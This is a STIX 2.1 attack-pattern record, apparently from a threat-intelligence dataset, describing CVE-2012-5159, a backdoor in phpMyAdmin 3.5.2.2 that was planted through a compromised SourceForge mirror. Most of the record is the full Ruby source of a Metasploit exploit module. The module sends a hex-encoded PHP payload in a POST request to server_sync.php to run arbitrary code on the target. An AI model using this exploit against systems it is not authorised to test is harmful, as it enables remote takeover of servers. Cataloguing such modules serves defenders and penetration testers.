{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--855c5b9c-eef6-4357-9033-e2b7d3b966de",
    "created": "2024-08-14T17:09:41.205511Z",
    "modified": "2024-08-14T17:09:41.205515Z",
    "name": "phpMyAdmin 3.5.2.2 server_sync.php Backdoor",
    "description": " This module exploits an arbitrary code execution backdoor placed into phpMyAdmin v3.5.2.2 through a compromised SourceForge mirror. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/phpmyadmin_3522_backdoor.rb",
            "external_id": "phpmyadmin_3522_backdoor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-5159"
        },
        {
            "source_name": "reference",
            "url": "http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'phpMyAdmin 3.5.2.2 server_sync.php Backdoor',\n      'Description'    => %q{\n          This module exploits an arbitrary code execution backdoor\n        placed into phpMyAdmin v3.5.2.2 through a compromised SourceForge mirror.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-5159' ],\n          [ 'OSVDB', '85739' ],\n          [ 'EDB', '21834' ],\n          [ 'URL', 'http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'ConnectionType' => 'find',\n            },\n          # Arbitrary big number. The payload gets sent as an HTTP\n          # response body, so really it's unlimited\n          'Space'       => 262144, # 256k\n        },\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 30\n        },\n      'DisclosureDate' => '2012-09-25',\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DefaultTarget' => 0))\n\n    register_options([\n      OptString.new('PATH', [ true , \"The base directory containing phpMyAdmin try\", '/phpMyAdmin'])\n    ])\n  end\n\n  def exploit\n\n    uris = []\n\n    tpath = datastore['PATH']\n    if tpath[-1,1] == '/'\n      tpath = tpath.chop\n    end\n\n    pdata = \"c=\" + Rex::Text.to_hex(payload.encoded, \"%\")\n\n    res = send_request_raw( {\n      'global'  => true,\n      'uri'     => tpath + \"/server_sync.php\",\n      'method'  => 'POST',\n      'data'    => pdata,\n      'headers' => {\n        'Content-Type'   => 'application/x-www-form-urlencoded',\n        'Content-Length' => pdata.length,\n      }\n    }, 1.0)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-09-25",
    "x_mitre_platforms": [
        "php'"
    ]
}